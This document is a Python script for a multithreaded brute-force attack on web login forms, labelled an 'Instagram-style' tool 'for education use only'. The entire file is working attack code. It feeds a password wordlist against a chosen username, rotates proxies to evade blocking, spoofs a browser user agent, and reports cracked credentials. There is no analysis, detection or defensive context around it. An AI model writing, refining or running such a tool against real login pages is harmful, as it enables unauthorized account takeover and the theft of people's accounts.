import requests
import threading
import queue
import random
import argparse
import sys
import time

banner = r'''
██████╗ ███████╗██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║
██████╔╝█████╗  ██║  ██║██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝  ██║  ██║██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║
██║  ██║███████╗██████╔╝██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
'''

print(banner)
time.sleep(1)

password_queue = queue.Queue()
proxy_list = []
lock = threading.Lock()

def load_wordlist(wordlist_file):
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            password_queue.put(line.strip())

def load_proxies(proxy_file):
    global proxy_list
    with open(proxy_file, "r") as f:
        proxy_list = [line.strip() for line in f.readlines() if line.strip()]

def get_random_proxy():
    with lock:
        if not proxy_list:
            return None
        return random.choice(proxy_list)

def remove_proxy(proxy):
    with lock:
        if proxy in proxy_list:
            proxy_list.remove(proxy)
            print(f"[!] Proxy removed: {proxy}")

def attempt_login(url, username, password):
    proxy = get_random_proxy()
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    } if proxy else None

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
    }

    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data, proxies=proxies, headers=headers, timeout=10)

        if "Welcome" in response.text or response.status_code in [200, 302]:
            print(f"\n[+] SUCCESS: {username}:{password}")
            with password_queue.mutex:
                password_queue.queue.clear()
            return True
        else:
            print(f"[-] Invalid: {password}")
    except requests.RequestException as e:
        print(f"[!] Proxy failed: {proxy} ({e.__class__.__name__})")
        if proxy:
            remove_proxy(proxy)
    return False

def worker(url, username):
    while not password_queue.empty():
        password = password_queue.get()
        if attempt_login(url, username, password):
            break
        password_queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="⚔️ Instagram-style Brute Force Tool (Education Use Only)")
    parser.add_argument("--url", required=True, help="Login URL to target")
    parser.add_argument("--username", required=True, help="Username to brute force")
    parser.add_argument("--wordlist", required=True, help="Password wordlist file")
    parser.add_argument("--proxies", help="Optional proxy list file (IP:PORT per line)")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads")

    args = parser.parse_args()

    print("[*] Loading wordlist...")
    load_wordlist(args.wordlist)

    if args.proxies:
        print("[*] Loading proxies...")
        load_proxies(args.proxies)
        print(f"[*] {len(proxy_list)} proxies loaded.")

    print(f"[*] Starting attack on {args.username} using {args.threads} threads...\n")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.url, args.username))
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("\n[!] Attack completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting.")
        sys.exit()
